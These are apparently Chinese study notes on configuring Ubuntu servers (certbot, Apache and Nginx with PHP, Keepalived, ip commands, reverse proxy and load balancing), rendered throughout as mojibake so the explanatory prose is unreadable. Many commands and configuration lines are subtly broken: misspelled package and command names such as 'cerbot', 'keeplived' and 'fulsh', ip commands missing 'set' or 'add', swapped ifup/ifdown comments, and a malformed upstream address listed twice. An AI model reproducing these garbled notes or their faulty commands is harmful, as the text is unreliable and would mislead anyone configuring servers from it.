å®¶æœºæ„å·²ç»æœ‰å…è´¹çš„äº†ï¼Œæ¯”å¦‚Let's encryptLetâ€™s encrypt è‡´åŠ›äºåŠ é€Ÿå…¨æ–‡å®ç°httpsçš„å…è´¹è¯ä¹¦é¢å‘æœºæ„ è¯ä¹¦æœ‰æ•ˆæœŸ90å¤©(å¯åˆ·æ–°) ä¸“é—¨å®¢æˆ·ç«¯ç¨‹åº Certbotï¼Œç®€åŒ–è¯ä¹¦æ­¥éª¤sudo add-apt-repository ppa:certbot/certbot # æ·»åŠ ä»“åº“ sudo apt update sudo apt install cerbot python-cerbot-apache ä½¿ç”¨æ–¹æ³•ï¼š # å‰æ åŸŸåæ­£å¸¸è§£æã€è®¾ç½®å¥½è™šæ‹Ÿä¸»æœº # ç”³è¯·è¯ä¹¦ (--apacheæ„æ€æ˜¯ç»™apacheç”¨çš„ï¼Œ -dæ˜¯åŸŸå,è¿˜æœ‰å­åŸŸå) sudo certbot --apache -d example.com -d www.example.com # è¯ä¹¦ä½ç½® /etc/letsencrypt/live # æŸ¥çœ‹è¯ä¹¦çŠ¶æ€(æ¢æˆè‡ªå·±çš„åŸŸå) https://www.ssllab.com/ssltest/analyze.html?d=example.com&amp;latest Apacheæ”¯æŒPHP1.å®‰è£… sudo apt install php7.2 libapache2-mod-php7.2 # mod-phpæ¨¡å— # éªŒè¯ php -v 2.å¯ç”¨æ¨¡å— # ç›´æ¥å¯ç”¨å³å¯ a2enmod php7.2 # Apacheå¯¹phpçš„æ”¯æŒæ˜¯æ¨¡å—åŒ–çš„ï¼Œè€ŒNginxå¯¹phpæ”¯æŒçš„é…ç½®æ–¹å¼æ¯”è¾ƒåŸå§‹ ç´¢å¼•æ–‡ä»¶ vim /etc/apache2/mods-available/dir.conf # index.php # é‡å¯ sudo systemctl restart apache2 é…ç½®æ–‡ä»¶ /etc/php/7.2/ # ä¸‹é¢ä¸åŒçš„ç›®å½•ï¼Œæ˜¯é’ˆå¯¹ä¸åŒåº”ç”¨çš„ï¼Œè¿™é‡Œapacheçš„åœ¨apacheå­ç›®å½•ä¸‹é¢ /usr/lib/php/7.2/ # ä¸ºä¸åŒçš„ä½¿ç”¨åœºæ™¯çš„é…ç½®æ–‡ä»¶(å¼€å‘ç¯å¢ƒä¸ç”Ÿäº§ç¯å¢ƒï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¼šæŠŠè¿™é‡Œçš„æ–‡ä»¶é“¾æ¥åˆ°ä¸Šé¢çš„é…ç½®ä¸­) Keepalivedé«˜å¯ç”¨çš„ä¸€ç§è§£å†³æ–¹æ¡ˆï¼šKeepalived å®ç°é«˜å¯ç”¨(HA) åœ¨æœåŠ¡å™¨ç»„å†…æ¼‚ç§»çš„VIPï¼ˆå¤šå°æœåŠ¡å™¨å®ç°ä¸€ä¸ªç»„ï¼Œä½†ä¹Ÿæ˜¯ä¸€ä¸ªåŸŸåï¼Œè§£æåˆ°ä¸€ä¸ªipï¼‰ Masterç‹¬å VIPï¼Œå…¶ä»–Serveræ£€æŸ¥Masterå¯ç”¨æ€§ Keepaliveså¹¶éä¸“é—¨é’ˆå¯¹Apacheè€Œè®¾è®¡ å¸¸ç”¨äºè´Ÿè½½å‡è¡¡æŠ€æœ¯ç¯å¢ƒ ç»„å†…æœåŠ¡å™¨åº”æä¾›ç›¸åŒå†…å®¹å’Œé…ç½® ç»„å†…ä¸åŒæœåŠ¡å™¨æœ‰ä¼˜å…ˆçº§ï¼Œå¤šä¸ªæœåŠ¡å™¨å…±ç”¨ä¸€ä¸ªæ¼‚ç§»çš„ipåœ°å€(VIP)ï¼Œå¤„äºæ­£å¸¸çŠ¶æ€çš„æœåŠ¡å™¨å«Maste å®‰è£…sudo apt-get install keepalived # å› ä¸ºæ— é…ç½®ï¼Œæ‰€æœ‰é»˜è®¤å¯åŠ¨å¤±è´¥ /etc/keepalived/keepalived.conf # é…ç½®æ–‡ä»¶ï¼ˆéœ€è¦åˆ›å»ºï¼‰ é…ç½®æ–‡ä»¶ï¼š # å¯é€‰é…ç½®é¡¹ï¼Œä½†æ˜¯ä¸€èˆ¬å»ºè®®é…ç½® global_defs { notification_email { myemail@mycompany.com # å‘é€é‚®ä»¶ç»™è° } notification_email_from keepalives@mycompany smtp_server 192.168.1.150 smtp_connect_timeout 30 router_id mycompany_web_prod } # å…³é”®é…ç½® # 1å·é…ç½®å®ä¾‹ vrrp_instance VI_1 { smtp_alter interface enp0s3 # ç½‘å¡æ¥å£ä¼˜å…ˆçº§ virtual_router_id 51 # å®šä¹‰æœåŠ¡å™¨ç»„ priority 100 # ä¼˜å…ˆçº§(è‡ªå·±å®šä¹‰ï¼Œä¿è¯é¡ºåºå³å¯) advert_int 5 # å‘¨æœŸæ€§é€šå‘Šçš„é—´éš”æ—¶é—´ virtual_ipaddress { 192.168.1.200 # VIPï¼ˆDHCPä»¥å¤–ï¼‰ } } # é‡å¯æœåŠ¡ systemctl start keepalived systemctl status -l keeplived # ç½‘å¡ç»‘å®šVIP ip a ç­‰å¾…30s # å®‰è£…ç¬¬äºŒå°æœåŠ¡å™¨ï¼Œå¹¶è¿›è¡Œç±»ä¼¼çš„é…ç½®(ä¼˜å…ˆçº§ä¿®æ”¹,vipåœ°å€å¡«å†™ä¸€æ ·çš„) # æ¨¡æ‹Ÿåˆ‡æ¢ systemctl stop keepalived systemctl start keepalived ä¸ä»…å¯ä»¥é…åˆApacheä½¿ç”¨ï¼Œè¿˜å¯é…åˆå…¶ä»–ä½¿ç”¨ Ubuntu 18.04æ–°ç‰¹æ€§å“ˆå“ˆå“ˆï¼Œå‰å‡ å¤©20.04éƒ½å·²ç»æ­£å¼å‘å¸ƒäº†ï¼Œæˆ‘å¬è¯¾è¿›åº¦å¤ªæ…¢ å†…æ ¸æ˜¯å…³é”® ç½‘ç»œé…ç½®å¤šä¸ªåœ°å€ï¼Œè¦ç”¨é€—å·åˆ†éš”é‡å¯æœåŠ¡ï¼šsudo netplan apply æ¡¥æ¥çš„ç‰©ç†ç½‘å¡è®¾ç½®ä¸ºæ²¡æœ‰ip æ¡Œé¢ç«¯ï¼š # ifconfig / ifup / if down å·²ç»é»˜è®¤ä¸å®‰è£…äº† # å¯¹åº”ä¸Šé¢ ip link set eth0 up / ip link set eth0 down networkctlå‘½ä»¤ # æ­¤å‘½ä»¤åœ°ä½æ›´åŠ çªå‡º networkctl status / networkctl status eth0 # æŸ¥çœ‹ä¸åŒç½‘å¡çš„çŠ¶æ€å’Œè¯¦ç»†ä¿¡æ¯ ipå‘½ä»¤ip link sudo ip link ens33 down # downæ‰, ç›¸å½“äºifup sudo ip link ens33 up # å¯åŠ¨ç½‘å¡, ç›¸å½“äº ifdown ip link ls ens33 # æŸ¥çœ‹ç½‘å¡çš„linkä¿¡æ¯ ip -s -d link ls ens33 # æŸ¥çœ‹ç½‘å¡çš„linkä¿¡æ¯(æ›´è¯¦ç»†) ip -s -s -d link ls ens33 # æŸ¥çœ‹ç½‘å¡çš„linkä¿¡æ¯(æ›´æ›´è¯¦ç»†) ip link set dev ens33 mtu 1500 # ä¿®æ”¹MTU ip link set dev ens33 address 00:11:22:33:44:55 # ä¿®æ”¹MAC ip addr ip addr # ip a ip addr show # è·Ÿä¸Šé¢æ²¡ä»€ä¹ˆå·®åˆ« ip addr add dev ens33 192.168.1.10/24 # æ‰‹åŠ¨ç»™ç½‘å¡æ·»åŠ ip ip addr del dev ens33 192.168.1.10/24 # æ‰‹åŠ¨ç»™ç½‘å¡åˆ é™¤ip ip addr fulsh dev ens33 # æ¸…é™¤ç½‘å¡ä¿¡æ¯ ip route ip route show # æŸ¥çœ‹è·¯ç”±ä¿¡æ¯ ip route ip route get 1.1.1.1 # æŸ¥çœ‹åˆ°è¾¾æŒ‡å®šç›®çš„ipï¼Œè®¡ç®—è¦ç»è¿‡çš„è·¯ç”± sudo ip route default via 192.168.1.2 # æ·»åŠ é»˜è®¤è·¯ç”±(ç½‘å…³åœ°å€) sudo ip route dev ens33 2.0.0.0/8 via 192.168.1.1 # æŒ‡å®šå»å¾€æŸä¸ªç½‘ç»œï¼Œéƒ½è¦ç»è¿‡1.1è¿™ä¸ªè·¯ç”±ï¼Œå¹¶æŒ‡å®šç½‘å¡è¿›è¡Œè½¬å‘ ip maddress # ç»„æ’­åœ°å€ ip maddress # æŸ¥çœ‹æ‰€æœ‰ç½‘å¡éƒ½å±äºå“ªä¸ªç»„æ’­åœ°å€ ip maddress ls ens33 # æŸ¥çœ‹æŒ‡å®šç½‘å¡å±äºå“ªä¸ªç»„æ’­åœ°å€ ip maddress add 33:33:00:00:00:01 dev ens33 # æŠŠå“ªä¸ªç½‘å¡åŠ å…¥åˆ°æŸä¸ªç»„æ’­åœ°å€ ip neighboræŸ¥arpç¼“å­˜ # æŸ¥çœ‹ ip neigh ip -s -s neighbor show # æ‰‹åŠ¨ç»‘å®šipä¸macåœ°å€ï¼ˆé˜²æ­¢arpæ¬ºéª—ï¼‰ lladdrå³é€»è¾‘é“¾è·¯å±‚åœ°å€ï¼Œ permæ˜¯æ°¸ä¹…ç”Ÿæ•ˆ ip neighbor add dev ens33 192.168.0.131 lladdr 00:11:22:33:44:55 nud perm ip monitorç›‘è§†ç½‘ç»œé‡Œé¢åœ°å€ç­‰è§£æçš„å˜åŒ– ip monitor all # æœ‰ç€ä¸åŒçš„çŠ¶æ€ Nginx å¼€æºï¼Œè½»é‡ï¼Œå¿«é€Ÿï¼Œå¯æ‰©å±•çš„WebæœåŠ¡å™¨ Github, Netflix, Wordpresséƒ½åŸºäºNginx ä½†æ˜¯å¯é…ç½®èƒ½åŠ›å¼±äºApache é€‚ç”¨äºå¤§æµé‡ï¼Œé«˜å¹¶å‘ç¯å¢ƒï¼ˆç¨³å®šå¿«é€Ÿï¼Œå ç”¨èµ„æºå°‘â€“C10Ké—®é¢˜ï¼‰ åœ¨Top 1000ä¸ªç½‘ç«™ä¸­ä½¿ç”¨ç‡æœ€é«˜ ApacheåŸºäºçº¿ç¨‹ åŸºäºè¿›ç¨‹(è¿è¡Œä¸­çš„æ–‡ä»¶å°±å«è¿›ç¨‹)æ¶ˆè€—èµ„æºå¤š åŒè¿›ç¨‹ä¸‹çš„å¤šçº¿ç¨‹å…±äº«å†…å­˜ï¼ˆä¸€æŸä¿±æŸï¼‰ Nginxä½¿ç”¨äº‹ä»¶é©±åŠ¨çš„æ¶æ„ æ–°å®¢æˆ·ç«¯è¯·æ±‚æ—¶ä¸åˆ›å»ºæ–°çš„è¿›ç¨‹/çº¿ç¨‹ äº‹ä»¶å¤„ç†å™¨å¤„ç†è¯·æ±‚ä»»åŠ¡ æ›´å°‘çš„å¤„ç†æ—¶é—´ï¼Œæ›´å°‘çš„å†…å­˜æ¶ˆè€— Apacheä¸Nginxå…±ç”¨ Apacheå¤„ç†åŠ¨æ€å†…å®¹ Nginxå¤„ç†é™æ€å†…å®¹ å®‰è£…sudo apt install nginx # é…ç½®æ–‡ä»¶åœ¨ /etc/nginx é…ç½®æ–‡ä»¶# /etc/nginx # ä¸»é…ç½®æ–‡ä»¶ nginx.conf # è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ sites-available sites-enabled # å¯ç”¨çš„ï¼Œæ˜¯ä¸ªé“¾æ¥ snippets # å¯ä»¥å¤ç”¨çš„ç‰‡æ®µ ä¸»é…ç½®æ–‡ä»¶# /etc/nginx/nginx.conf user www-data; # ç”¨æˆ· worker_processes auto; # è¿›ç¨‹æ•° include /etc/nginx/modules-enabled/*.conf; # å¼•å…¥çš„æ¨¡å—é…ç½® events { worker_connections 768; # æ¯ä¸ªè¿›ç¨‹æœ€å¤§çš„å¹¶å‘è¿æ¥æ•° # multi_accept on; } http { sendfile on; # å¯¹å†…æ ¸ é™æ€èµ„æºçš„è®¿é—®é€Ÿåº¦(éƒ½è¦å¼€ç€) tcp_nopush on; # ä¼˜åŒ–äº†å¯¹tcpåè®®æ ˆæ€§èƒ½(ä¼˜åŒ–äº†æ•°æ®åŒ…çš„å¤§å°,å¤šä¸ªå°åŒ…å˜æˆå¤§åŒ…å†å‘) tcp_nodelay on; # ä¸ä¸Šé¢çš„å‚æ•°ç›¸å(ä»å‘åŒ…çš„å»¶æ—¶è¿›è¡Œä¼˜åŒ–,æ¥ä¸€ä¸ªåŒ…å°±å‘) keepalive_timeout 65; # æ²¡ä¸€ä¸ªTCPè¿æ¥æœ€å¤§çš„ä¿æ´»çš„æ—¶é—´ types_hash_max_size 2048; # MIMEç±»å‹é•œå¤´å†…å®¹hashè¡¨å¤§å° ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶ipå’Œç«¯å£ä¸€æ ·ï¼Œä½¿ç”¨ä¸åŒåŸŸåæ¥æŒ‡å‘ä¸åŒç«™ç‚¹ # /etc/nginx/sites-available/ # å¯ç”¨ç«™ç‚¹ # /etc/nginx/sites-enabled/ # å·²å¯ç”¨ç«™ç‚¹ # /etc/nginx/sites-available/default server{ listen 80 default_server; # ä¾¦å¬çš„ç«¯å£ root /var/www/htmll; # æ ¹ç›®å½• index index.html index.htm index.nginx-debian.html; # ç´¢å¼•æ–‡ä»¶ server_name www.xpsshuai.cn; # ä¸»æœºå(åŸŸå) } location / { # ä¸»url # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. try_files $uri $uri/ =404; # èµ„æºæ²¡æœ‰å°±404 } æ–°å»ºè™šæ‹Ÿä¸»æœº(Server Blocks)å®ä¾‹ Nginxä¸­å«æœåŠ¡å™¨å—ï¼Œä½†ä¸œè¥¿è·ŸApacheä¸­è™šæ‹Ÿä¸»æœºæ˜¯ä¸€æ ·çš„ sudo mkdir /var/www/qq.com # æ¯ä¸ªå•ç‹¬çš„Server Blockä¸€ä¸ªé…ç½®æ–‡ä»¶ sudo cp /etc/nginx/sites-available/default /etc/nginx/sites-available/qq.com sudo vim /etc/nginx/sites-available/qq.com # å†…å®¹ server{ listen 80; # å› ä¸ºè¿™é‡Œéƒ½ä¾¦å¬80ç«¯å£ï¼Œæ‰€ä»¥ä¸ºäº†å’Œé»˜è®¤ç«™ç‚¹åŒºåˆ†ï¼Œè¦æŒ‡å®šä¸åŒåŸŸå server_name www.qqq.com; root /var/www/qq.com; } # å…¶ä»–é…ç½®é¡¹å¯ä»¥å–æ¶ˆæ³¨é‡Šè‡ªè¡Œé…ç½® location ~ /\.ht { # è¿™ä¸ªå»ºè®®å¯ç”¨ï¼Œä»¥..å¼€å¤´,ä»¥htç»“å°¾çš„ä½ æˆ‘ä»¬å°±æ‹’ç»è®¿é—®-->å½“ç„¶ä¹Ÿå¯ä»¥å¢åŠ æ›´å¤šç­–ç•¥ deny all; } # åˆ›å»ºå¯ç”¨çš„ç¬¦å·é“¾æ¥(Apacheæ˜¯site2enableï¼Œè¿™é‡Œæ²¡æœ‰ä¸“é—¨çš„å‘½ä»¤) sudo ln -s /etc/nginx/sites-available/qq.com /etc/nginx/sites-enabled/qq.com # é‡å¯ sudo systemctl restart nginx # è®¿é—®åŸŸåï¼Œå°±ä¼šè®¿é—®åˆ°qq.comï¼Œå› ä¸ºè¯·æ±‚ä¸­çš„hostå­—æ®µæ˜¯ä¸ä¸€æ ·çš„ # å…¶ä»–ç«™ç‚¹åŒä¸Š Nginxæ”¯æŒPHPWebServeræœ¬èº«åªæ˜¯æä¾›èµ„æºçš„ï¼Œå¿…é¡»é…åˆphpç­‰è„šæœ¬æ‰èƒ½è¿›è¡Œé€»è¾‘çš„è¿ç®— 1.å®‰è£…fastCGI process manager(FPM) â€“&gt; å°±èƒ½é…åˆNginxé…åˆè¿›è¡Œå¤„ç†(NginxæŠŠæ¥æ”¶åˆ°çš„è¯·æ±‚è½¬å‘ç»™phpå¤„ç†) sudo apt install php-fpm # å®‰è£… # æŸ¥çœ‹ä½ç½® ls /var/run/php/ /var/run/php/php7.2-fpm.sock # è¿›ç¨‹åç§°(è®°ä½è·¯å¾„) # éªŒè¯ php -v 2.é…ç½®Nginx # ä¿®æ”¹é…ç½® sudo vim /etc/nginx/sites-available/qq.com location ~ \.php$ { # åŒ¹é…æ‰€æœ‰è®¿é—®.phpçš„è¯·æ±‚ include snippets/fastcgi-php.conf; fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # æ„æ€æ˜¯: æŠŠæ‰€æœ‰è®¿é—®.phpçš„æ‹“å±•åçš„èµ„æºï¼Œéƒ½è½¬å‘ç»™è¿™é‡Œpassçš„phpè¿›ç¨‹ } # è¿˜æœ‰ï¼Œç´¢å¼•é¡µé¢ä¹Ÿè¦æ·»åŠ  index.php 3.é…ç½®PHP # sudo vim /etc/php/7.2/fpm/php.ini # è¿™é‡Œåªç®€å•è®²å‡ ä¸ªé…ç½® cgi.fix_pathinfo=0 # å¿…é¡»ä¿®æ”¹ä¸º0, å®‰å…¨ file_uploads = On # å¦‚æœä¸éœ€è¦å°±å…³æ‰ï¼Œçœ‹è‡ªå·±éœ€æ±‚ max_file_uploads = 20 # é™åˆ¶å•ä¸ªæ–‡ä»¶ä¸Šä¼ å¤§å° allow_url_fopen = On # æ˜¯å¦å…è®¸æ–‡ä»¶åŒ…å«(å¦‚æœæ²¡ä¸šåŠ¡éœ€è¦ï¼Œå»ºè®®å…³é—­) allow_url_include = Off memory_limit = 128M # æŒ‡å®šå†…å­˜å¤§å°(æœ€å°128M,çœ‹ä¸šåŠ¡éœ€æ±‚) 4.é‡æ–°åŠ è½½ sudo nginx -t sudo systemctl reload nginx # é‡å¯php sudo systemctl restart php7.2-fpm 5.é‡æ–°è®¿é—®phpé¡µé¢ï¼ŒæŸ¥çœ‹æ˜¯å¦æ­£ç¡®è§£æ Nginxæ”¯æŒSSLè‡ªç­¾åè¯ä¹¦ (è‡ªå·±æµ‹è¯•æˆ–è€…ä¸éœ€è¦é‚£ä¹ˆå®‰å…¨çš„æƒ…å†µä¸‹) â€“&gt; æœºå¯†æ€§å’Œå®Œæ•´æ€§å¯ä»¥ä¿è¯ï¼Œä½†æ˜¯èº«ä»½è®¤è¯æ˜¯ä¸ä¼šè¢«å…¬ç½‘æ‰€ä¿¡ä»»çš„ # x509æ ‡å‡†æ ¼å¼çš„, ç§é’¥æ˜¯ç»å¯¹ä¸èƒ½æ³„æ¼çš„, åé¢æ˜¯ç»‘å®šçš„ä¸€ä¸ªè¯ä¹¦ sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/qq.key -out /etc/ssl/certs/qq.pem # ä¸€æ—¦åŸŸåç»‘å®šäº†è¯ä¹¦ï¼Œå°±å¿…é¡»é€šè¿‡è¿™ä¸ªåŸŸåæ¥è®¿é—® # è‹¥å‘CAè¯ä¹¦é¢å‘æœºæ„ç”³è¯·è¯ä¹¦æ–¹æ³• åŒä¸ŠApache æœåŠ¡å—é…ç½® # sudo vim /etc/nginx/sites-available/qq.com server { listen 443 ssl; # 443ç«¯å£æ˜¯ ssl, é€šè¿‡httpsè®¿é—® server_name www.qqq.com; ssl_certificate /etc/ssl/certs/qq.pem; ssl_certificate_key /etc/ssl/private/qq.key; root /var/www/qq.com } # é‡å¯æœåŠ¡ systemctl restart nginx # è®¿é—®https://xxxxxx ä¼šå‘ç°æµè§ˆå™¨ä¼šæç¤ºè¯ä¹¦ä¸ä¿¡ä»» Letâ€™s encryptç¬¬ä¸‰æ–¹çš„httpsçš„å¼€æºçš„å…è´¹è¯ä¹¦é¢å‘æœºæ„ï¼Œå‘ä»–æ¥ç”³è¯·è¯ä¹¦ 1.å®‰è£… sudo add-apt-repository ppa:certbot/certbot # æ·»åŠ ä»“åº“ sudo apt update sudo apt install cerbot # å®¢æˆ·ç«¯ç¨‹åº(ç®€åŒ–äº†ç”³è¯·æµç¨‹) sudo apt install python-cerbot-nginx 2.ä½¿ç”¨æ–¹æ³•ï¼š # å‰æ åŸŸåæ­£å¸¸è§£æã€è®¾ç½®å¥½è™šæ‹Ÿä¸»æœº # 2.1ç”³è¯·è¯ä¹¦ (--nginxæ„æ€æ˜¯ç»™nginxç”¨çš„ï¼Œ -dæ˜¯åŸŸå,è¿˜æœ‰å­åŸŸå) , -mæ˜¯ç®¡ç†å‘˜é‚®ç®± sudo certbot --nginx -d example.com -d www.example.com -m admin@example.com # è¯ä¹¦å­˜æ”¾ä½ç½® /etc/letsencrypt/live # 2.2ä¿®æ”¹è‡ªå·±é…ç½®æ–‡ä»¶ä¸­è¯ä¹¦çš„ä½ç½® # sudo vim /etc/nginx/sites-available/qq.com ssl_certificate # 2.3 æ‰‹åŠ¨è¯ä¹¦æ›´æ–°(å› ä¸ºé»˜è®¤è¯ä¹¦æœ‰æ•ˆæœŸæ˜¯90å¤©) sudo certbot renew --dry-run # 2.4æµ‹è¯• æŸ¥çœ‹è¯ä¹¦çŠ¶æ€(è¾“å…¥è‡ªå·±çš„åŸŸå) å¯ä»¥æŸ¥çœ‹åˆ°ä¸€äº›å®‰å…¨éšæ‚£ç­‰è¯¦ç»†ä¿¡æ¯ https://www.ssllab.com/ssltest/ # sslçš„ä¿¡æ¯æ‰«æ(ä¸å®‰å…¨çš„åœ°æ–¹)ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå·±æœ¬åœ°çš„å·¥å…· Nginxåå‘ä»£ç† å¾ˆå¤šæƒ…å†µä¸‹ï¼ŒNginxä¸æ˜¯ä½œä¸ºWebServerä½¿ç”¨çš„ï¼Œæœ€å¸¸è§çš„å°±æ˜¯ä½œä¸ºåå‘ä»£ç† é¦–å…ˆè¯´ä¸€ä¸‹ä»£ç†: ä»£ç†å®¢æˆ·ç«¯è®¿é—®å¤–ç½‘æœåŠ¡å™¨ã€‚ä»£ç†æ˜¯é‡æ–°ç”Ÿæˆçš„è¯·æ±‚(æ¯”å¦‚å…¬å¸å†…éƒ¨é™åˆ¶å‘˜å·¥ä¸Šç½‘çš„åœºæ™¯)åå‘ä»£ç†ï¼š - ä»£ç†æœåŠ¡å™¨å¯¹å¤–æä¾›æœåŠ¡ï¼Œæ¥å—å®¢æˆ·ç«¯è¯·æ±‚ - å®‰å…¨å±‚è¿‡æ»¤å®¢æˆ·ç«¯æ¶æ„è¯·æ±‚(äº‘) - å¯ä»¥æ”¾åœ¨é˜²ç«å¢™å¤–é¢ï¼Œç”šè‡³æ”¾åœ¨äº‘ä¸Š(äº‘WAFæœ¬è´¨ä¸Šå°±æ˜¯åå‘ä»£ç†, è¯·æ±‚é€šè¿‡DNSè§£æåˆ°äº‘wafä¸Šï¼Œè¿›è¡Œè¿‡æ»¤) Apacheä¸é€‚ç”¨äºé«˜å¹¶å‘ï¼Œé«˜è´Ÿè½½ç¯å¢ƒ Nginxæ²¡æœ‰å†…å»ºæ”¯æŒåŠ¨æ€å†…å®¹å¤„ç†èƒ½åŠ› ç»“åˆApache/Nginxçš„ä¼˜åŠ¿ Nginxæ¥å—å…¥ç«™è¯·æ±‚å’Œé™æ€å†…å®¹ç¼“å­˜ï¼ŒåŠ¨æ€è¯·æ±‚å‘ç»™Apache Apacheå®ŒæˆåŠ¨æ€å†…å®¹å¤„ç† Nginxä½œä¸ºåå‘ä»£ç†ï¼ˆåŠ¨æ€è¯·æ±‚è½¬å‘ç»™Apacheï¼‰ Nginxæ”¾åœ¨WebServerå‰é¢ï¼Œå†å°†è¯·æ±‚å‘ç»™WebServerã€‚ç„¶åæœåŠ¡ç«¯æŠŠæ•°æ®é€šè¿‡Nginxå‘ç”¨æˆ·äº¤ä»˜æ•°æ® ä¸ä»…å‡ç¼“äº†Apacheçš„æµé‡å‹åŠ›ï¼Œä¹Ÿè¿›è¡Œäº†ä¸€å®šçš„å®‰å…¨è¿‡æ»¤ Nginxå®ç°åå‘ä»£ç† åŒä¸€å°æœåŠ¡å™¨çš„æµé‡è½¬å‘ 1.æœ¬æœºå®‰è£…Apache æ³¨æ„: å…ˆåœæ‰nginxçš„æœåŠ¡ systemctl stop nginx å†å®‰è£… sudo apt install apache2 2.ä¿®æ”¹Apacheä¾¦å¬ç«¯å£ 1. # vim /etc/apache2/ports.conf #è®©apacheä¸å ç”¨80, è®©nginxä¾¦å¬80ç«¯å£ Listen 8080 &lt;IfModule ssl_module> Listen 8443 &lt;/IfModule> &lt;IfModule mod_gnutls.c> Listen 8443 &lt;/IfModule> 2.ä¿®æ”¹apacheè™šæ‹Ÿç«™ç‚¹é»˜è®¤ä¾¦å¬ç«¯å£ vim /etc/apache2/sites-available/000-default.conf ä¹Ÿæ”¹ä¸º8080 3.é‡å¯æœåŠ¡ systemctl restart apache2 3.Nginxåå‘ä»£ç†è®¾ç½® # vim /etc/nginx/sites-available/default #ä¿®æ”¹nginxé…ç½®ï¼Œä¾¦å¬80ç«¯å£ï¼Œç„¶ååŠ¨æ€éƒ¨åˆ†çš„æµé‡è½¬å‘ç»™apache,è€Œé™æ€æ–‡ä»¶è¿˜æ˜¯æ”¾Nginxä¸Šè¯»å–(è¿™é‡Œä»¥phpä¸ºä¾‹) # åŠ¨æ€å†…å®¹è¿›è¡Œè½¬å‘ location ~ \.php$ { include snippets/fastcgi-php.conf; # fastcgi_pass unix:/var/run/php/php7.2-fpm.sock; # è¿™é‡Œå°±ä¸ç”¨nginxè§£æphpäº†ï¼Œç”¨apache(é…ç½®åœ¨ä¸Šé¢å°ç»“) proxy_pass http://127.0.0.1:8080; # å‡¡æ˜¯phpçš„åŠ¨æ€å†…å®¹éƒ½è½¬å‘ç»™æœ¬æœºçš„8080(å³Apache) proxy_set_header X-Real-IP $remote_addr; # é€šå¸¸ä¼šæ·»åŠ ä¸€äº›ä»£ç†è¯·æ±‚å¤´(ä¾¿äºåŒºåˆ†) proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # è¿™ä¸ªå¤´éƒ¨è™½ç„¶ä¸æ˜¯RFCæ ‡å‡†ï¼Œä½†æ˜¯ä¹Ÿæ˜¯è®°å½•äº†ç»è¿‡äº†å“ªäº›ä»£ç†åœ°å€ proxy_set_header Host $host; proxy_set_header X-Forward-Proto $scheme; } # é™æ€å†…å®¹ç•™ç»™è‡ªå·±ï¼ˆå¢åŠ ä¸€ä¸ªlocationï¼‰ location ~* \.(js|css|jpg|png|svg|html|htm)$ { expires 10d; # æŒ‡å®šè¿‡æœŸæ—¶é—´ 10å¤© } 4.æ£€æŸ¥Nginxé…ç½®å¹¶é‡å¯ sudo nginx -t # æ£€æŸ¥é…ç½®è¯­æ³• sudo systemctl restart nginx # é‡å¯ 5.é…ç½®Apacheæ”¯æŒphpè§£æ # 1.å®‰è£… sudo apt install php7.2 libapache2-mod-php7.2 # mod-phpæ¨¡å— # éªŒè¯ php -v # 2.å¯ç”¨æ¨¡å— a2enmod php7.2 # 3.ç´¢å¼•æ–‡ä»¶ vim /etc/apache2/mods-available/dir.conf # å¢åŠ index.php # 4.é‡å¯apache sudo systemctl restart apache2 6.æµ‹è¯•èƒ½å¦æ­£å¸¸è®¿é—® å¤šå°æœåŠ¡å™¨çš„Nginxåå“ä»£ç†ï¼Œè¿›è¡Œæµé‡è½¬å‘å®éªŒç¯å¢ƒï¼šä¸€å°ubuntuå®‰è£…apache, ä¸¤å°è™šæ‹Ÿæœºå®‰è£…Nginxå®¢æˆ·ç«¯å‘ç¬¬ä¸€å°NginxæœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè½¬å‘ç»™ç¬¬äºŒå°NginxæœåŠ¡å™¨ï¼Œç„¶åè½¬å‘ç»™æœ€åä¸€å°Apacheé“¾å¼ä»£ç† 1.Nginxæœºå™¨ N11.å®‰è£…Nginx2.é…ç½®(è¿™é‡Œåšå®éªŒå°±ç®€å•åœ°ç”¨äº†é»˜è®¤çš„é…ç½®äº†) # /etc/nginx/sites-available/default location / { # æ‰€æœ‰å‘åˆ°æˆ‘è¿™é‡Œçš„è¯·æ±‚éƒ½è½¬å‘ç»™N2 proxy_pass http://192.168.0.104; } 3.é‡å¯Nginx 2.Nginxæœºå™¨ N21.å®‰è£…Nginx2.é…ç½® # /etc/nginx/sites-available/default location / { # æ‰€æœ‰å‘åˆ°æˆ‘è¿™é‡Œçš„è¯·æ±‚éƒ½è½¬å‘ç»™N2 proxy_pass http://192.168.0.105; } 3.é‡å¯Nginx 3.Apacheæœºå™¨ A3å®‰è£…apacheç„¶åå®¢æˆ·ç«¯è®¿é—®N1, å°±ä¼šçœ‹åˆ°A3çš„é¡µé¢ Nginxè´Ÿè½½å‡è¡¡ åŸºäºåå‘ä»£ç†å®ç°è´Ÿè½½å‡è¡¡ è´Ÿè½½å‡è¡¡ï¼š å‰é¢æ”¾ä¸€ä¸ªNginxè¿›è¡Œåå‘ä»£ç†ï¼Œåé¢æ”¾å¤šä¸ªApacheä½œä¸ºWebServer åŸºæœ¬é…ç½® # å®šä¹‰ä¸€ä¸ªæœåŠ¡å™¨ç»„(è¦è½¬å‘åˆ°çš„ç›®æ ‡ç»„) upstream srvs { # upstreamåªæ˜¯ä¸€ä¸ªç»„çš„åç§° least_conn; # è´Ÿè½½å‡è¡¡æ–¹æ³•è§„åˆ™ --æœ€å°‘è¿æ¥æ•°ä¼˜å…ˆ (è¯¦ç»†è§ä¸‹é¢) server 192.168.106:80 weight=1; # server æ˜¯åé¢çš„ä¸€ä¸ªWebServer(apacheæˆ–Nginx)çš„åœ°å€ï¼Œ weight æ˜¯æƒé‡(è¶Šå¤§æ¥æ”¶çš„æµé‡å°±è¶Šå¤š) server 192.168.106:80 weight=2; } # é…ç½® server { location / { proxy_pass http://srvs; # ä¸Šé¢å®šä¹‰çš„ç»„çš„åç§°(ä¸éœ€è¦è¢«DNSè§£æï¼Œä»…ä»…æ˜¯ä¸€ä¸ªæ ‡è¯†) } } 